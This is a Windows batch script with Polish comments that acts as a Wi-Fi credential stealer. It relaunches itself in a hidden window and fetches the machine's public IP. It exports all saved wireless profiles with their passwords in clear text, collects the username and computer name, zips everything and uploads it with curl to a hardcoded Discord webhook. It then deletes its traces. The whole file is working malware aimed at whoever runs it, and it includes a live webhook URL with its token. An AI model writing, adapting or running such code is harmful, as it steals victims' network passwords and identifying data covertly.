@echo off
if "%1" == "hidden_run" goto :real_run

:: Uruchomienie w ukrytym oknie
powershell -window minimized -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden_run' -WindowStyle Hidden"
exit /b

:real_run
setlocal enabledelayedexpansion

:: Konfiguracja
set "webhook_url=https://discord.com/api/webhooks/1354838417522950285/qmS5hIkHj9cTaG0Hy-mkT6MnWtc9nADJ0rBGdrH9eck20TnYV639WiP1n5b4T3icbq9G"
set "zip_name=%temp%\WiFi_Profiles.zip"
set "temp_dir=%temp%\wifi_profiles"
set "7z_path=%ProgramFiles%\7-Zip\7z.exe"

:: Pobieranie zewnętrznego IP (z mojeip.pl)
set "public_ip="
for /f "tokens=* delims=" %%A in ('powershell -command "(Invoke-WebRequest -Uri 'https://mojeip.pl' -UseBasicParsing).Content -match '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; $matches[0]"') do (
    set "public_ip=%%A"
)

:: Tworzenie pliku z danymi komputera
echo [PC Info] > "%temp_dir%\pc_info.txt"
echo Username: %USERNAME% >> "%temp_dir%\pc_info.txt"
echo Computer: %COMPUTERNAME% >> "%temp_dir%\pc_info.txt"
echo Public IP: !public_ip! >> "%temp_dir%\pc_info.txt"
echo Date: %date% %time% >> "%temp_dir%\pc_info.txt"

:: Eksport profili Wi-Fi
if exist "%temp_dir%" rmdir /s /q "%temp_dir%" >nul 2>&1
mkdir "%temp_dir%" >nul 2>&1

for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "Profil"') do (
    set "profile_name=%%a"
    set "profile_name=!profile_name:~1!"
    netsh wlan export profile name="!profile_name!" key=clear folder="%temp_dir%" >nul 2>&1
)

:: Pakowanie do ZIP
if exist "%7z_path%" (
    "%7z_path%" a -tzip "%zip_name%" "%temp_dir%\*" >nul 2>&1
) else (
    powershell -command "Compress-Archive -Path '%temp_dir%\*' -DestinationPath '%zip_name%' -Force" >nul 2>&1
)

:: Wysyłanie na Discord
if exist "%zip_name%" (
    curl -s -F "file1=@%zip_name%" -F "payload_json={\"content\":\"**WiFi Profiles from:**\n> **User:** %USERNAME%\n> **PC:** %COMPUTERNAME%\n> **Public IP:** !public_ip!\"}" "%webhook_url%" >nul 2>&1
    del "%zip_name%" >nul 2>&1
)

:: Czyszczenie
rmdir /s /q "%temp_dir%" >nul 2>&1
exit
